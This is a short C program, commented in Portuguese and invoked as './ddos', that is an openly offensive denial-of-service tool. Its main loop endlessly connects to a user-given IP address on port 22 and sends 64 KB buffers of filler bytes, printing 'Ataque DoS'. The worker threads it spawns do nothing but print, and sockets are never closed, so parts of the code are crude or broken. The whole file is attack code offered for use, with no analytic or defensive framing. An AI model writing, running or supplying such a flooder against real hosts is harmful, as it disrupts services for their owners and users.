#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netdb.h>
#include <string.h>

#define MAX_PACKET_LENGTH 65535
#define NUM_THREADS 20

// Função de execução de cada thread
void *threadFunction(void *arg)
{
	int thread_id = *(int *)arg;
	printf("Thread %d is running\n", thread_id);
	//pthread_exit(NULL);
}

int main(int argc, char *argv[])
{
	if (argc < 2) 
	{
		printf("Modo de uso: ./ddos 192.168.0.1\n");
		return 0;
	}

	char *destino = argv[1];
	int porta = 22;
	struct sockaddr_in alvo;

	pthread_t threads[NUM_THREADS];
	int thread_ids[NUM_THREADS];

	// Criação das threads
	for (int i = 0; i < NUM_THREADS; ++i)
	{
		thread_ids[i] = i;
		printf("Thread de número %d.\n", thread_ids[i]);
		int result = pthread_create(&threads[i], NULL, threadFunction, &thread_ids[i]);
		if (result)
		{
			fprintf(stderr, "Error creating thread %d: %d\n", i, result);
			exit(EXIT_FAILURE);
		}
	}

	int mysock;
	int conecta;

	// Conectar e enviar pacotes em loop
	while (1)
	{
		mysock = socket(AF_INET, SOCK_STREAM, 0);
		alvo.sin_family = AF_INET;
		alvo.sin_port = htons(porta);
		alvo.sin_addr.s_addr = inet_addr(destino);

		conecta = connect(mysock, (struct sockaddr *)&alvo, sizeof alvo);

		char packet[MAX_PACKET_LENGTH];
		memset(packet, 'A', sizeof(packet));

		ssize_t bytes_sent = send(mysock, packet, sizeof(packet), 0);

		if (conecta == 0 )
		{
			printf("Ataque DoS no %s na porta %d.\n ", destino, porta);
		}
		if (bytes_sent < 0)
		{
			printf("Error!");
		}
		else
		{
			printf("Sent %zd bytes.\n", bytes_sent);
		}
	}

	return 0;
}
